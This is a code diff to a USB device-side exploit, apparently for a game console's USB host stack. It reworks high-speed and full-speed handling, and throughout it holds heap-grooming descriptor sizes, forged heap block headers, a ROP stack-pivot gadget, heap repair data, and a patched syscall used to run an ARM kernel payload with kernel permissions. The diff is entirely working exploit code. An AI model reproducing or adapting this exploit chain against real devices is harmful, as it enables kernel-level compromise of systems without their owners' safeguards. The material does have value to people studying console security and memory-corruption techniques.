@@ -19,13 +19,13 @@
 
 #include "../arm_kernel/arm_kernel.bin.h"
 
-#ifdef HIGH_SPEED
+static const uint8_t heap_repair_data_full_speed[] = {
+#include "data-0x102ad880-full-speed.inc"
+};
+
+#ifndef NO_HIGH_SPEED
 static const uint8_t heap_repair_data[] = {
 #include "data-0x102ad880.inc"
-};
-#else
-static const uint8_t heap_repair_data[] = {
-#include "data-0x102ad880-full-speed.inc"
 };
 #endif
 
@@ -35,45 +35,38 @@ static const uint8_t heap_repair_data[] = {
 // custom request to upload data into the stack
 #define USB_REQ_CUSTOM 0x30
 
-#ifdef HIGH_SPEED
+// location of the pEp0DmaBuf (containing the final rop, arm kernel and event)
+#define EP0DMABUF_LOCATION 0x1029d880u
 // location of the last descriptor storing data
-#define LAST_DESC_LOCATION 0x102a7fe0
+#define LAST_DESC_LOCATION 0x102ab3a0u
+#define LAST_DESC_LOCATION_HS 0x102a7fe0u
 // location of the UhsCtrlXferMgr structure
-#define CTRL_MGR_LOCATION 0x102b0860
-// offset to the repair data we need to copy
-#define HEAP_REPAIR_OFFSET 0x58a0
-#else
-// location of the last descriptor storing data
-#define LAST_DESC_LOCATION 0x102ab3a0
-// location of the UhsCtrlXferMgr structure
-#define CTRL_MGR_LOCATION 0x102b50a0
+#define CTRL_MGR_LOCATION 0x102b50a0u
+#define CTRL_MGR_LOCATION_HS 0x102b0860u
 // offset to the repair data we need to copy
 #define HEAP_REPAIR_OFFSET 0x24e0
-#endif
+#define HEAP_REPAIR_OFFSET_HS 0x58a0
 
 // final rop after the stackpivot
 #define FINAL_ROP_OFFSET 0x100
-#define FINAL_ROP_LOCATION (LAST_DESC_LOCATION + FINAL_ROP_OFFSET)
+#define FINAL_ROP_LOCATION (EP0DMABUF_LOCATION + FINAL_ROP_OFFSET)
 
 // stores the arm kernel binary before it gets copied into kernel memory
 #define ARM_KERNEL_OFFSET 0x500
-#define ARM_KERNEL_LOCATION (LAST_DESC_LOCATION + ARM_KERNEL_OFFSET)
+#define ARM_KERNEL_LOCATION (EP0DMABUF_LOCATION + ARM_KERNEL_OFFSET)
 
 // custom event
 #define CUSTOM_EVENT_OFFSET 0x2000
-#define CUSTOM_EVENT_LOCATION (LAST_DESC_LOCATION + CUSTOM_EVENT_OFFSET)
-
-// offset of the UhsCtrlXferMgr structure
-#define CTRL_MGR_OFFSET (CTRL_MGR_LOCATION - LAST_DESC_LOCATION)
+#define CUSTOM_EVENT_LOCATION (EP0DMABUF_LOCATION + CUSTOM_EVENT_OFFSET)
 
 // the beginning of IOS_SetFaultBehaviour
 // this is the syscall we patch to execute functions with kernel permissions
-#define REPLACE_SYSCALL 0x081298bc
+#define REPLACE_SYSCALL 0x081298bcu
 
 // the location from where our arm kernel binary runs
-#define ARM_CODE_BASE 0x08135000
+#define ARM_CODE_BASE 0x08135000u
 
-#define IOS_SHUTDOWN 0x1012ee4c
+#define IOS_SHUTDOWN 0x1012ee4cu
 
 /*
     We'll use a flaw in IOS_Create thread to memset code with kernel permissions
@@ -213,9 +206,9 @@ static const uint32_t stackpivot_rop[] = {
 static const ControlTransactionEvent xferEventData = {
     .header = {
         .index = 0,
-        .queue = cpu_to_be32(CTRL_MGR_LOCATION + offsetof(UhsCtrlXferMgr, control_transaction_queue)),
+        .queue = 0, // will be filled out below once used
         .prev = 0,
-        .next = cpu_to_be32(CTRL_MGR_LOCATION + offsetof(UhsCtrlXferMgr, events)), // can't be 0, so point into the events buf
+        .next = 0, // will be filled out below once used
     },
     .bmRequestType = USB_DIR_IN,
     .bRequest = USB_REQ_CUSTOM, // custom request
@@ -223,12 +216,12 @@ static const ControlTransactionEvent xferEventData = {
     .wIndex = 0,
     .wLength = cpu_to_be16(sizeof(stackpivot_rop) + 4),
     // background thread stack (everything below 0x1016AD70 crashes)
-    .buffer = cpu_to_be32(0x1016ad70),
+    .buffer = cpu_to_be32(0x1016ad70u),
     .argptr = 0,
-    .timeout = cpu_to_be32(7500000),
+    .timeout = cpu_to_be32(7500000u),
     .result = 0,
     // SP will be 0x1016ace4 when the callback is called
-    .callback = cpu_to_be32(0x10103084), // add sp, sp, #0x84; pop {r4, r5, r6, pc}
+    .callback = cpu_to_be32(0x10103084u), // add sp, sp, #0x84; pop {r4, r5, r6, pc}
 };
 
 static struct usb_device_descriptor device_descriptor = {
@@ -266,7 +259,7 @@ int device_bind(udpih_device_t* device, uint16_t maxpacket)
     return 0;
 }
 
-int device_setup(udpih_device_t *device, const struct usb_ctrlrequest *ctrlrequest, uint8_t *buf)
+int device_setup(udpih_device_t *device, const struct usb_ctrlrequest *ctrlrequest, uint8_t *buf, bool high_speed)
 {
     int result = -EINVAL;
 
@@ -308,11 +301,7 @@ int device_setup(udpih_device_t *device, const struct usb_ctrlrequest *ctrlreque
 
             if (device->state == STATE_DEVICE0_CONNECTED) {
                 // everything above 0xca0 will be placed at the end of the heap
-#ifdef HIGH_SPEED
-                const uint32_t descriptor0_size = 0xf260;
-#else
-                const uint32_t descriptor0_size = 0xaa20;
-#endif
+                const uint32_t descriptor0_size = high_speed ? 0xf260 : 0xaa20;
                 const uint32_t descriptor1_size = 0xca0; //<- this one just fills up that annoying heap hole
                 const uint32_t descriptor2_size = 0x40;
                 const uint32_t descriptor3_size = 0x40;
@@ -447,14 +436,13 @@ int device_setup(udpih_device_t *device, const struct usb_ctrlrequest *ctrlreque
                     break;
                 }
             } else if (device->state == STATE_DEVICE2_CONNECTED) {
-#ifdef HIGH_SPEED
-                const uint32_t descriptor0_size = 0xe2a0; // <- fill up heap holes
-                const uint32_t descriptor1_size = 0x5380 + sizeof(HeapBlockHeader);
-#else
-                const uint32_t descriptor0_size = 0xaa40; // <- fill up heap holes
-                const uint32_t descriptor1_size = 0x8760;
-#endif
-                const uint32_t descriptor2_size = CTRL_MGR_OFFSET + sizeof(UhsCtrlXferMgr);
+                const uint32_t last_desc_location = high_speed ? LAST_DESC_LOCATION_HS : LAST_DESC_LOCATION;
+                const uint32_t ctrl_mgr_location = high_speed ? CTRL_MGR_LOCATION_HS : CTRL_MGR_LOCATION;
+                const uint32_t ctrl_mgr_offset = ctrl_mgr_location - last_desc_location;
+
+                const uint32_t descriptor0_size = high_speed ? 0xe2a0 : 0xaa40; // <- fill up heap holes
+                const uint32_t descriptor1_size = high_speed ? (0x5380 + sizeof(HeapBlockHeader)) : 0x8760;
+                const uint32_t descriptor2_size = ctrl_mgr_offset + sizeof(UhsCtrlXferMgr);
 
                 switch (wIndex) {
                 case 0:
@@ -480,10 +468,10 @@ int device_setup(udpih_device_t *device, const struct usb_ctrlrequest *ctrlreque
                         // this is where the next pointer will point to
                         // add a large heap header here
                         HeapBlockHeader* hdr = (HeapBlockHeader*) (buf + 0x5380);
-                        hdr->magic = cpu_to_be32(0xBABE0000);
-                        hdr->size = cpu_to_be32(0x100000);
+                        hdr->magic = cpu_to_be32(0xBABE0000u);
+                        hdr->size = cpu_to_be32(0x100000u);
                         // make sure the previous block gets updated
-                        hdr->prev = cpu_to_be32(0x102c0580);
+                        hdr->prev = cpu_to_be32(0x102c0580u);
                         hdr->next = 0;
 
                         desc->wTotalLength = cpu_to_le16(sizeof(config_descriptor));
@@ -511,12 +499,21 @@ int device_setup(udpih_device_t *device, const struct usb_ctrlrequest *ctrlreque
                         // custom event will be placed at CUSTOM_EVENT_LOCATION
                         ControlTransactionEvent* xferEvent = (ControlTransactionEvent*) (buf + CUSTOM_EVENT_OFFSET);
                         memcpy(xferEvent, &xferEventData, sizeof(ControlTransactionEvent));
+                        xferEvent->header.queue = cpu_to_be32(ctrl_mgr_location + offsetof(UhsCtrlXferMgr, control_transaction_queue));
+                        xferEvent->header.next = cpu_to_be32(ctrl_mgr_location + offsetof(UhsCtrlXferMgr, events)); // can't be 0, so point into the events buf
 
                         // copy heap repair data
-                        memcpy(buf + HEAP_REPAIR_OFFSET, heap_repair_data, sizeof(heap_repair_data));
+#ifndef NO_HIGH_SPEED
+                        if (high_speed) {
+                            memcpy(buf + HEAP_REPAIR_OFFSET_HS, heap_repair_data, sizeof(heap_repair_data));
+                        } else
+#endif
+                        {
+                            memcpy(buf + HEAP_REPAIR_OFFSET, heap_repair_data_full_speed, sizeof(heap_repair_data_full_speed));
+                        }
 
                         // insert the custom event into the queue
-                        UhsCtrlXferMgr* xferMgr = (UhsCtrlXferMgr*) (buf + CTRL_MGR_OFFSET);
+                        UhsCtrlXferMgr* xferMgr = (UhsCtrlXferMgr*) (buf + ctrl_mgr_offset);
                         xferMgr->control_transaction_queue.numItems = cpu_to_be32(1);
                         xferMgr->control_transaction_queue.first = cpu_to_be32(CUSTOM_EVENT_LOCATION);
                         xferMgr->control_transaction_queue.last = cpu_to_be32(CUSTOM_EVENT_LOCATION);
